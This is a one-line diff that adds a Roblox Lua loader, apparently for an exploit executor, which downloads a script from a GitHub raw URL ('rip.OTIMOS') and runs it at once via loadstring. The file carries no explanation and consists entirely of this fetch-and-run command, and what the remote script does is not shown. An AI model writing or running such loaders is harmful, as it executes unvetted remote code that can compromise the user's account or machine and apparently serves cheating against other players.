@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Otimos/rip.OTIMOS/main/rip.OTIMOS"))()
